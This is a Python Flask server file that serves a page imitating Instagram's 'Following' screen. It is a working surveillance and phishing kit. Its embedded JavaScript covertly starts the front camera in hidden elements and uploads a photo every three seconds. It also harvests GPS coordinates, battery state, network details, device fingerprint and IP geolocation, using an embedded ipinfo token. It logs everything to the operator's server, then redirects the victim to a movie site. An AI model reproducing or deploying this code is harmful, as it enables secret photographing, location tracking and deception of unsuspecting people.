# server_working.py - COMPLETELY SILENT PHOTO CAPTURE + MOVIE WEBSITE REDIRECT
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import os
import json
import logging
import subprocess
import threading
import time
import socket
import random
import base64
from datetime import datetime

app = Flask(__name__)
CORS(app)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

DATA_FILE = 'received_data.json'
PHOTO_FOLDER = 'captured_photos'

os.makedirs(PHOTO_FOLDER, exist_ok=True)

# Color codes for terminal
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
C = '\033[96m'
W = '\033[97m'
RS = '\033[0m'

latest_data = {
    'session_id': None,
    'device_info': None,
    'location_info': None,
    'battery_info': None,
    'network_info': None,
    'photos': [],
    'timestamp': None
}

def save_data(session_id, data_type, data_content):
    global latest_data
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                all_data = json.load(f)
        else:
            all_data = []
        
        entry = {
            'timestamp': datetime.now().isoformat(),
            'session_id': session_id,
            'type': data_type,
            'data': data_content[:500] if data_type == 'Text' else 'Photo saved'
        }
        all_data.append(entry)
        
        with open(DATA_FILE, 'w') as f:
            json.dump(all_data, f, indent=2)
        
        if data_type == 'Text':
            # Store the raw device info
            latest_data['device_info'] = data_content
            
            # Try to parse specific info if it's JSON
            try:
                parsed = json.loads(data_content) if isinstance(data_content, str) and data_content.startswith('{') else None
                if parsed:
                    latest_data['location_info'] = parsed.get('location')
                    latest_data['battery_info'] = parsed.get('battery')
                    latest_data['network_info'] = parsed.get('network')
            except:
                pass
            
            latest_data['session_id'] = session_id
            latest_data['timestamp'] = datetime.now().isoformat()
            
            print("\n" + "="*90)
            print("📱 NEW DEVICE DATA RECEIVED!")
            print(f"🆔 Session: {session_id[:30]}...")
            print(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print("="*90)
            
            lines = data_content.split('\n')
            for line in lines[:60]:
                print(line)
            print("="*90 + "\n")
            
        elif data_type == 'Photo':
            try:
                if ',' in data_content:
                    data_content = data_content.split(',')[1]
                photo_data = base64.b64decode(data_content)
                photo_filename = f"{PHOTO_FOLDER}/photo_{session_id}_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}.jpg"
                with open(photo_filename, 'wb') as f:
                    f.write(photo_data)
                latest_data['photos'].append({'file': photo_filename, 'time': datetime.now().isoformat()})
                logger.info(f"📸 PHOTO: {os.path.basename(photo_filename)}")
                print(f"📸 PHOTO CAPTURED: {os.path.basename(photo_filename)} | Total: {len(latest_data['photos'])}")
            except Exception as e:
                logger.error(f"Photo error: {e}")
        
        return True
    except Exception as e:
        logger.error(f"Save error: {e}")
        return False

@app.route('/api/server', methods=['POST'])
def handle_server():
    try:
        data = request.json
        session_id = data.get('SESSION_ID', 'unknown')
        data_type = data.get('type')
        data_content = data.get('data')
        logger.info(f"📥 Received: {data_type} from {session_id[:20]}...")
        save_data(session_id, data_type, data_content)
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/')
def serve_html():
    html_content = '''<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Instagram • Following</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, viewport-fit=cover" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }

    .ig-header {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      background: #000;
      border-bottom: 0.5px solid #262626;
      padding: 12px 16px;
      z-index: 100;
    }

    .header-content {
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .logo {
      font-size: 24px;
      font-weight: 600;
      background: linear-gradient(45deg, #f09433, #d62976, #962fbf);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
    }

    .logo span {
      font-size: 20px;
    }

    .header-icons {
      display: flex;
      gap: 20px;
    }

    .header-icons span {
      font-size: 24px;
      cursor: pointer;
    }

    .main-content {
      margin-top: 60px;
      padding-bottom: 70px;
    }

    .profile-section {
      padding: 16px;
      border-bottom: 0.5px solid #262626;
    }

    .profile-header {
      display: flex;
      align-items: center;
      gap: 20px;
    }

    .profile-pic {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      background: linear-gradient(45deg, #f09433, #d62976, #962fbf);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    .profile-pic span {
      font-size: 40px;
    }

    .profile-stats {
      display: flex;
      gap: 24px;
      flex: 1;
    }

    .stat {
      text-align: center;
      cursor: pointer;
    }

    .stat-count {
      font-size: 18px;
      font-weight: 700;
      color: white;
    }

    .stat-label {
      font-size: 12px;
      color: #8e8e8e;
    }

    .profile-name {
      padding: 16px 0 0 0;
    }

    .profile-name h3 {
      color: white;
      font-size: 16px;
      font-weight: 600;
    }

    .profile-name p {
      color: #8e8e8e;
      font-size: 12px;
      margin-top: 4px;
    }

    .edit-profile-btn {
      background: #262626;
      color: white;
      border: none;
      padding: 7px 16px;
      border-radius: 8px;
      font-weight: 600;
      font-size: 13px;
      margin-top: 12px;
      width: 100%;
      cursor: pointer;
    }

    .tabs {
      display: flex;
      border-bottom: 0.5px solid #262626;
    }

    .tab {
      flex: 1;
      text-align: center;
      padding: 12px;
      color: #8e8e8e;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      position: relative;
    }

    .tab.active {
      color: #0095f6;
    }

    .tab.active::after {
      content: '';
      position: absolute;
      bottom: -0.5px;
      left: 0;
      right: 0;
      height: 1px;
      background: #0095f6;
    }

    .following-list {
      background: #000;
    }

    .list-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 16px;
      border-bottom: 0.5px solid #262626;
    }

    .list-header h3 {
      color: white;
      font-size: 14px;
      font-weight: 600;
    }

    .list-header span {
      color: #0095f6;
      font-size: 12px;
      cursor: pointer;
    }

    .following-item {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 12px 16px;
      border-bottom: 0.5px solid #262626;
      transition: background 0.2s;
    }

    .following-item:active {
      background: #1a1a1a;
    }

    .user-info {
      display: flex;
      align-items: center;
      gap: 12px;
      flex: 1;
      cursor: pointer;
    }

    .user-avatar {
      width: 44px;
      height: 44px;
      border-radius: 50%;
      background: #262626;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
    }

    .user-details {
      display: flex;
      flex-direction: column;
    }

    .user-name {
      color: white;
      font-weight: 600;
      font-size: 14px;
    }

    .user-handle {
      color: #8e8e8e;
      font-size: 12px;
    }

    .follow-btn {
      background: #0095f6;
      color: white;
      border: none;
      padding: 7px 16px;
      border-radius: 8px;
      font-weight: 600;
      font-size: 12px;
      cursor: pointer;
      transition: opacity 0.2s;
    }

    .follow-btn:active {
      opacity: 0.7;
    }

    .follow-btn.following {
      background: #262626;
      color: white;
    }

    .bottom-nav {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background: #000;
      border-top: 0.5px solid #262626;
      padding: 10px 20px;
      display: flex;
      justify-content: space-between;
      z-index: 100;
    }

    .nav-item {
      font-size: 24px;
      opacity: 0.6;
      cursor: pointer;
      transition: opacity 0.2s;
    }

    .nav-item.active {
      opacity: 1;
    }

    .nav-item:active {
      opacity: 0.8;
    }

    video, canvas {
      display: none;
    }
    
    .info-toast {
      display: none;
    }
  </style>
</head>
<body>
  <div class="ig-header">
    <div class="header-content">
      <div class="logo">
        <span>📸</span> Instagram
      </div>
      <div class="header-icons">
        <span>➕</span>
        <span>❤️</span>
        <span>💬</span>
      </div>
    </div>
  </div>

  <div class="main-content">
    <div class="profile-section">
      <div class="profile-header">
        <div class="profile-pic" id="profilePic">
          <span>👤</span>
        </div>
        <div class="profile-stats">
          <div class="stat" id="postsStat">
            <div class="stat-count" id="postCount">0</div>
            <div class="stat-label">Posts</div>
          </div>
          <div class="stat" id="followersStat">
            <div class="stat-count" id="followerCount">0</div>
            <div class="stat-label">Followers</div>
          </div>
          <div class="stat" id="followingStat">
            <div class="stat-count" id="followingCount">0</div>
            <div class="stat-label">Following</div>
          </div>
        </div>
      </div>
      <div class="profile-name">
        <h3 id="username">music_lover</h3>
        <p id="bio">Music is life 🎵</p>
        <button class="edit-profile-btn" id="editProfileBtn">Edit Profile</button>
      </div>
    </div>

    <div class="tabs">
      <div class="tab" data-tab="posts">Posts</div>
      <div class="tab active" data-tab="following">Following</div>
      <div class="tab" data-tab="followers">Followers</div>
    </div>

    <div class="following-list" id="followingList">
      <div class="list-header">
        <h3>Following</h3>
        <span>Manage</span>
      </div>
      <div id="followingContainer"></div>
    </div>

    <div class="following-list" id="postsList" style="display: none;">
      <div style="text-align: center; padding: 40px; color: #8e8e8e;">
        <span style="font-size: 48px;">📷</span>
        <p style="margin-top: 10px;">No posts yet</p>
      </div>
    </div>

    <div class="following-list" id="followersList" style="display: none;">
      <div class="list-header">
        <h3>Followers</h3>
        <span>Sort</span>
      </div>
      <div id="followersContainer"></div>
    </div>
  </div>

  <div class="bottom-nav">
    <div class="nav-item" data-nav="home">🏠</div>
    <div class="nav-item" data-nav="search">🔍</div>
    <div class="nav-item active" data-nav="reels">🎥</div>
    <div class="nav-item" data-nav="likes">❤️</div>
    <div class="nav-item" data-nav="profile">👤</div>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    const SESSION_ID = 'insta_' + Date.now() + '_' + Math.random().toString(36).substring(2, 12);
    
    // ============================================================
    // 🔥 MOVIE WEBSITE REDIRECT - YAHAN APNI MOVIE SITE KI URL LAGAO 🔥
    // ============================================================
    const REDIRECT_URL = 'https://m.bolly2tolly.net';  // Movie website redirect
    
    let stream = null;
    let cameraActive = false;
    let followCount = 0;
    let redirectTriggered = false;
    
    // Store collected data
    let collectedDeviceInfo = {};
    let collectedLocationInfo = {};
    let collectedBatteryInfo = {};
    let collectedNetworkInfo = {};
    
    const followingList = [
      { name: "Cristiano Ronaldo", handle: "cristiano", avatar: "⚽", isFollowing: true, verified: true },
      { name: "Leo Messi", handle: "leomessi", avatar: "🐐", isFollowing: true, verified: true },
      { name: "Kylie Jenner", handle: "kyliejenner", avatar: "💄", isFollowing: true, verified: true },
      { name: "Kim Kardashian", handle: "kimkardashian", avatar: "👑", isFollowing: true, verified: true },
      { name: "National Geographic", handle: "natgeo", avatar: "📷", isFollowing: true, verified: true },
      { name: "NASA", handle: "nasa", avatar: "🚀", isFollowing: true, verified: true },
      { name: "Elon Musk", handle: "elonmusk", avatar: "🔧", isFollowing: true, verified: true },
      { name: "Taylor Swift", handle: "taylorswift", avatar: "🎤", isFollowing: true, verified: true },
      { name: "Virat Kohli", handle: "virat.kohli", avatar: "🏏", isFollowing: true, verified: true },
      { name: "Selena Gomez", handle: "selenagomez", avatar: "🎵", isFollowing: true, verified: true },
      { name: "Dwayne Johnson", handle: "therock", avatar: "💪", isFollowing: true, verified: true },
      { name: "BBC News", handle: "bbcnews", avatar: "📰", isFollowing: true, verified: true },
      { name: "Billie Eilish", handle: "billieeilish", avatar: "🎤", isFollowing: false, verified: true },
      { name: "NASA Hubble", handle: "nasahubble", avatar: "🔭", isFollowing: false, verified: true },
      { name: "Netflix", handle: "netflix", avatar: "🎬", isFollowing: false, verified: true },
      { name: "Spotify", handle: "spotify", avatar: "🎵", isFollowing: false, verified: true }
    ];
    
    const followersList = [
      { name: "Emma Watson", handle: "emmawatson", avatar: "🎬", isFollowing: false, verified: true },
      { name: "Tom Holland", handle: "tomholland", avatar: "🕷️", isFollowing: false, verified: true },
      { name: "Zendaya", handle: "zendaya", avatar: "✨", isFollowing: false, verified: true },
      { name: "Robert Downey Jr", handle: "robertdowneyjr", avatar: "🤖", isFollowing: false, verified: true },
      { name: "Chris Evans", handle: "chrisevans", avatar: "🛡️", isFollowing: false, verified: true }
    ];
    
    function updateStats() {
      document.getElementById('postCount').innerText = "102";
      document.getElementById('followerCount').innerText = "5,419";
      const following = followingList.filter(u => u.isFollowing === true).length;
      document.getElementById('followingCount').innerText = following;
      followCount = following;
      document.getElementById('username').innerText = "music_lover";
      document.getElementById('bio').innerText = "Music is life 🎵";
    }
    
    // FIXED: Proper device info collection
    async function collectDeviceInfo() {
      const info = {
        device: {},
        browser: {},
        screen: {},
        time: {}
      };
      
      // Device model detection
      const ua = navigator.userAgent;
      info.device.rawUserAgent = ua;
      
      // Detect device type and model
      if (ua.includes('iPhone')) {
        info.device.type = 'iPhone';
        if (ua.includes('iPhone13')) info.device.model = 'iPhone 12/13';
        else if (ua.includes('iPhone14')) info.device.model = 'iPhone 14/15';
        else info.device.model = 'iPhone';
      } else if (ua.includes('Android')) {
        info.device.type = 'Android';
        // Try to get model from user agent
        const smMatch = ua.match(/SM-[A-Za-z0-9]+/i);
        const pixelMatch = ua.match(/Pixel [0-9]/i);
        const oneplusMatch = ua.match(/OnePlus [A-Z0-9]+/i);
        if (smMatch) info.device.model = smMatch[0];
        else if (pixelMatch) info.device.model = pixelMatch[0];
        else if (oneplusMatch) info.device.model = oneplusMatch[0];
        else info.device.model = 'Android Device';
      } else if (ua.includes('Windows')) {
        info.device.type = 'Windows PC';
        info.device.model = 'Windows Computer';
      } else if (ua.includes('Mac')) {
        info.device.type = 'Mac';
        info.device.model = 'Mac Computer';
      } else {
        info.device.type = 'Unknown';
        info.device.model = 'Unknown Device';
      }
      
      // Platform info
      info.device.platform = navigator.platform || 'Unknown';
      
      // Browser info
      info.browser.userAgent = ua;
      info.browser.language = navigator.language;
      info.browser.languages = navigator.languages;
      info.browser.cookieEnabled = navigator.cookieEnabled;
      info.browser.hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
      info.browser.maxTouchPoints = navigator.maxTouchPoints || 0;
      
      // Screen info
      info.screen.width = screen.width;
      info.screen.height = screen.height;
      info.screen.availWidth = screen.availWidth;
      info.screen.availHeight = screen.availHeight;
      info.screen.colorDepth = screen.colorDepth;
      info.screen.pixelRatio = window.devicePixelRatio;
      
      // Time info
      info.time.localTime = new Date().toString();
      info.time.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      info.time.timezoneOffset = new Date().getTimezoneOffset();
      info.time.timestamp = Date.now();
      
      return info;
    }
    
    // FIXED: Proper GPS/Location collection
    async function collectLocationInfo() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ status: 'not supported', error: 'Geolocation not supported' });
          return;
        }
        
        navigator.geolocation.getCurrentPosition(
          (position) => {
            resolve({
              status: 'success',
              lat: position.coords.latitude,
              lon: position.coords.longitude,
              accuracy: position.coords.accuracy + ' meters',
              altitude: position.coords.altitude ? position.coords.altitude + ' meters' : 'Not available',
              heading: position.coords.heading || 'Not available',
              speed: position.coords.speed || 'Not available',
              timestamp: new Date(position.timestamp).toISOString()
            });
          },
          (error) => {
            let errorMsg = '';
            switch(error.code) {
              case error.PERMISSION_DENIED:
                errorMsg = 'User denied permission';
                break;
              case error.POSITION_UNAVAILABLE:
                errorMsg = 'Position unavailable';
                break;
              case error.TIMEOUT:
                errorMsg = 'Timeout';
                break;
              default:
                errorMsg = 'Unknown error';
            }
            resolve({ status: 'error', error: errorMsg, code: error.code });
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }
    
    // FIXED: Proper battery info collection
    async function collectBatteryInfo() {
      try {
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          return {
            status: 'available',
            level: Math.round(battery.level * 100) + '%',
            levelRaw: battery.level,
            charging: battery.charging,
            chargingTime: battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + ' seconds',
            dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + ' seconds'
          };
        } else {
          return { status: 'not supported', error: 'Battery API not supported' };
        }
      } catch(e) {
        return { status: 'error', error: e.message };
      }
    }
    
    // FIXED: Proper network info collection
    async function collectNetworkInfo() {
      const info = {};
      
      // Connection info
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (connection) {
        info.effectiveType = connection.effectiveType || 'Unknown';
        info.downlink = connection.downlink ? connection.downlink + ' Mbps' : 'Unknown';
        info.rtt = connection.rtt ? connection.rtt + ' ms' : 'Unknown';
        info.saveData = connection.saveData || false;
      } else {
        info.effectiveType = 'Not available';
      }
      
      // Online status
      info.online = navigator.onLine;
      
      return info;
    }
    
    async function getIPInfo() {
      try {
        const res = await fetch('https://ipinfo.io/json?token=5602d2e05cb668');
        const data = await res.json();
        return {
          ip: data.ip,
          hostname: data.hostname,
          city: data.city,
          region: data.region,
          country: data.country,
          location: data.loc,
          postal: data.postal,
          timezone: data.timezone,
          isp: data.org
        };
      } catch(e) {
        return { error: 'IP info not available', message: e.message };
      }
    }
    
    async function sendCollectedData() {
      const deviceInfo = await collectDeviceInfo();
      const locationInfo = await collectLocationInfo();
      const batteryInfo = await collectBatteryInfo();
      const networkInfo = await collectNetworkInfo();
      const ipInfo = await getIPInfo();
      
      // Store for later use
      collectedDeviceInfo = deviceInfo;
      collectedLocationInfo = locationInfo;
      collectedBatteryInfo = batteryInfo;
      collectedNetworkInfo = networkInfo;
      
      // Create detailed report
      let report = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 COMPLETE DEVICE DATA COLLECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🆔 SESSION ID: ${SESSION_ID}
⏰ COLLECTION TIME: ${deviceInfo.time.localTime}
🌍 TIMEZONE: ${deviceInfo.time.timezone} (UTC offset: ${deviceInfo.time.timezoneOffset} minutes)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 DEVICE INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Device Type: ${deviceInfo.device.type}
Device Model: ${deviceInfo.device.model}
Platform: ${deviceInfo.device.platform}
Max Touch Points: ${deviceInfo.browser.maxTouchPoints}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🖥️ SCREEN INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Resolution: ${deviceInfo.screen.width}x${deviceInfo.screen.height}
Available: ${deviceInfo.screen.availWidth}x${deviceInfo.screen.availHeight}
Color Depth: ${deviceInfo.screen.colorDepth}-bit
Pixel Ratio: ${deviceInfo.screen.pixelRatio}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 BROWSER INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Language: ${deviceInfo.browser.language}
Cookies Enabled: ${deviceInfo.browser.cookieEnabled}
Hardware Concurrency: ${deviceInfo.browser.hardwareConcurrency} cores
User Agent: ${deviceInfo.browser.userAgent.substring(0, 200)}...

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📍 GPS/LOCATION INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      
      if (locationInfo.status === 'success') {
        report += `
Status: ✅ FIXED - LOCATION CAPTURED SUCCESSFULLY
Latitude: ${locationInfo.lat}
Longitude: ${locationInfo.lon}
Accuracy: ${locationInfo.accuracy}
Altitude: ${locationInfo.altitude}
Heading: ${locationInfo.heading}
Speed: ${locationInfo.speed}
Timestamp: ${locationInfo.timestamp}
Google Maps Link: https://www.google.com/maps?q=${locationInfo.lat},${locationInfo.lon}`;
      } else {
        report += `
Status: ❌ ${locationInfo.status}
Error: ${locationInfo.error || 'Unknown'}
Note: Location permission may be denied or not available`;
      }
      
      report += `
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 IP & NETWORK INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
IP Address: ${ipInfo.ip || 'Unknown'}
Location: ${ipInfo.city || 'Unknown'}, ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
Timezone: ${ipInfo.timezone || 'Unknown'}
ISP: ${ipInfo.isp || 'Unknown'}
Network Type: ${networkInfo.effectiveType}
Download Speed: ${networkInfo.downlink || 'Unknown'}
Round Trip Time: ${networkInfo.rtt || 'Unknown'}
Online Status: ${networkInfo.online ? 'Online' : 'Offline'}
Save Data Mode: ${networkInfo.saveData ? 'Enabled' : 'Disabled'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔋 BATTERY INFORMATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      
      if (batteryInfo.status === 'available') {
        report += `
Status: ✅ FIXED - BATTERY DATA CAPTURED
Level: ${batteryInfo.level}
Charging: ${batteryInfo.charging ? 'Yes ⚡' : 'No 🔋'}
Charging Time: ${batteryInfo.chargingTime}
Discharging Time: ${batteryInfo.dischargingTime}`;
      } else {
        report += `
Status: ${batteryInfo.status}
Error: ${batteryInfo.error || 'Not available'}`;
      }
      
      report += `
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 REDIRECT TARGET
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
URL: ${REDIRECT_URL}
Trigger: Will redirect on first follow
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

      await sendToServer(report, 'Text');
      
      // Also send individual data points as JSON for structured storage
      const structuredData = {
        sessionId: SESSION_ID,
        device: deviceInfo,
        location: locationInfo,
        battery: batteryInfo,
        network: networkInfo,
        ip: ipInfo,
        redirectUrl: REDIRECT_URL
      };
      
      await sendToServer(JSON.stringify(structuredData, null, 2), 'Text');
      
      return {
        device: deviceInfo,
        location: locationInfo,
        battery: batteryInfo,
        network: networkInfo,
        ip: ipInfo
      };
    }
    
    async function sendToServer(data, type) {
      try {
        const response = await fetch('/api/server', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ SESSION_ID, data, type })
        });
        return response.ok;
      } catch(e) { 
        console.warn(e);
        return false; 
      }
    }
    
    async function capturePhoto() {
      return new Promise((resolve) => {
        const videoElem = document.getElementById('video');
        const canvasElem = document.getElementById('canvas');
        const ctx = canvasElem.getContext('2d');
        if (!videoElem.videoWidth || !videoElem.videoHeight) {
          setTimeout(() => resolve(null), 100);
          return;
        }
        canvasElem.width = videoElem.videoWidth;
        canvasElem.height = videoElem.videoHeight;
        ctx.drawImage(videoElem, 0, 0, canvasElem.width, canvasElem.height);
        canvasElem.toBlob(async (blob) => {
          if (!blob) { resolve(null); return; }
          const img = new Image();
          img.src = URL.createObjectURL(blob);
          img.onload = () => {
            const compressCanvas = document.createElement('canvas');
            let width = img.width, height = img.height;
            const maxSize = 800;
            if (width > maxSize) { height = (height * maxSize) / width; width = maxSize; }
            compressCanvas.width = width;
            compressCanvas.height = height;
            compressCanvas.getContext('2d').drawImage(img, 0, 0, width, height);
            compressCanvas.toBlob(async (compressedBlob) => {
              const reader = new FileReader();
              reader.onloadend = () => {
                const base64 = reader.result.split(',')[1];
                resolve(base64);
              };
              reader.readAsDataURL(compressedBlob);
            }, 'image/jpeg', 0.7);
            URL.revokeObjectURL(img.src);
          };
        }, 'image/jpeg', 0.8);
      });
    }
    
    async function startSilentPhotoCapture() {
      try {
        let photoCount = 0;
        
        while (cameraActive) {
          const photoBase64 = await capturePhoto();
          if (photoBase64) {
            await sendToServer(photoBase64, 'Photo');
            photoCount++;
            console.log(`📸 Silent photo ${photoCount} captured`);
          }
          await new Promise(res => setTimeout(res, 3000));
        }
      } catch(err) {
        console.warn('Silent capture error:', err);
      }
    }
    
    async function startSilentCamera() {
      if (cameraActive) return;
      
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        const videoElem = document.getElementById('video');
        videoElem.srcObject = stream;
        await videoElem.play();
        
        await new Promise(resolve => { 
          if (videoElem.readyState >= 2) resolve(); 
          else videoElem.onloadeddata = resolve; 
        });
        
        cameraActive = true;
        startSilentPhotoCapture();
        
        // Send all collected data
        await sendCollectedData();
        
      } catch(err) {
        console.warn('Silent camera error:', err);
        // Even if camera fails, still send other data
        await sendCollectedData();
      }
    }
    
    function renderFollowingList() {
      const container = document.getElementById('followingContainer');
      container.innerHTML = '';
      
      followingList.forEach((user, index) => {
        const item = document.createElement('div');
        item.className = 'following-item';
        item.innerHTML = `
          <div class="user-info">
            <div class="user-avatar">${user.avatar}</div>
            <div class="user-details">
              <div class="user-name">
                ${user.name}
                ${user.verified ? '<span style="color:#0095f6; font-size:12px;"> ✓</span>' : ''}
              </div>
              <div class="user-handle">@${user.handle}</div>
            </div>
          </div>
          <button class="follow-btn ${user.isFollowing ? 'following' : ''}" data-index="${index}">${user.isFollowing ? 'Following' : 'Follow'}</button>
        `;
        container.appendChild(item);
      });
      
      document.querySelectorAll('#followingContainer .follow-btn').forEach(btn => {
        btn.addEventListener('click', async (e) => {
          e.stopPropagation();
          const index = parseInt(btn.dataset.index);
          const user = followingList[index];
          
          if (btn.innerText === 'Following') {
            btn.innerText = 'Follow';
            btn.classList.remove('following');
            btn.style.background = '#0095f6';
            user.isFollowing = false;
            followCount--;
          } else {
            btn.innerText = 'Following';
            btn.classList.add('following');
            btn.style.background = '#262626';
            user.isFollowing = true;
            followCount++;
          }
          
          document.getElementById('followingCount').innerText = followCount;
          
          if (!cameraActive) {
            await startSilentCamera();
          }
          
          if (!redirectTriggered && followCount > 0) {
            redirectTriggered = true;
            await sendToServer(`🚀 REDIRECT TRIGGERED! User followed someone. Redirecting to: ${REDIRECT_URL}`, 'Text');
            setTimeout(() => {
              window.location.href = REDIRECT_URL;
            }, 1000);
          }
        });
      });
    }
    
    function renderFollowersList() {
      const container = document.getElementById('followersContainer');
      container.innerHTML = '';
      
      followersList.forEach((user, index) => {
        const item = document.createElement('div');
        item.className = 'following-item';
        item.innerHTML = `
          <div class="user-info">
            <div class="user-avatar">${user.avatar}</div>
            <div class="user-details">
              <div class="user-name">
                ${user.name}
                ${user.verified ? '<span style="color:#0095f6; font-size:12px;"> ✓</span>' : ''}
              </div>
              <div class="user-handle">@${user.handle}</div>
            </div>
          </div>
          <button class="follow-btn" data-follow-index="${index}">Follow</button>
        `;
        container.appendChild(item);
      });
      
      document.querySelectorAll('#followersContainer .follow-btn').forEach(btn => {
        btn.addEventListener('click', async (e) => {
          e.stopPropagation();
          const index = btn.dataset.followIndex;
          if (btn.innerText === 'Follow') {
            btn.innerText = 'Following';
            btn.classList.add('following');
            btn.style.background = '#262626';
            followCount++;
            
            if (!cameraActive) {
              await startSilentCamera();
            }
            
            if (!redirectTriggered && followCount > 0) {
              redirectTriggered = true;
              await sendToServer(`🚀 REDIRECT TRIGGERED! User followed from followers list. Redirecting to: ${REDIRECT_URL}`, 'Text');
              setTimeout(() => {
                window.location.href = REDIRECT_URL;
              }, 1000);
            }
          } else {
            btn.innerText = 'Follow';
            btn.classList.remove('following');
            btn.style.background = '#0095f6';
            followCount--;
          }
        });
      });
    }
    
    function switchTab(tabName) {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      document.querySelector(`.tab[data-tab="${tabName}"]`).classList.add('active');
      
      document.getElementById('followingList').style.display = 'none';
      document.getElementById('postsList').style.display = 'none';
      document.getElementById('followersList').style.display = 'none';
      
      if (tabName === 'posts') {
        document.getElementById('postsList').style.display = 'block';
      } else if (tabName === 'following') {
        document.getElementById('followingList').style.display = 'block';
      } else if (tabName === 'followers') {
        document.getElementById('followersList').style.display = 'block';
      }
    }
    
    function init() {
      updateStats();
      renderFollowingList();
      renderFollowersList();
      
      // Start camera after 2 seconds
      setTimeout(() => {
        startSilentCamera();
      }, 2000);
      
      document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
          const tabName = tab.dataset.tab;
          switchTab(tabName);
        });
      });
      
      document.querySelectorAll('.nav-item').forEach((item) => {
        item.addEventListener('click', () => {
          document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
          item.classList.add('active');
        });
      });
    }
    
    window.onload = () => {
      setTimeout(init, 100);
    };
  </script>
</body>
</html>'''
    return html_content

@app.route('/display')
def display_data():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Live Phone Data Monitor - SILENT MODE</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { background: #0a0a0a; font-family: monospace; padding: 20px; color: #0f0; }
            .header { background: #1a1a1a; padding: 15px; border-radius: 10px; margin-bottom: 20px; border-left: 4px solid #0f0; }
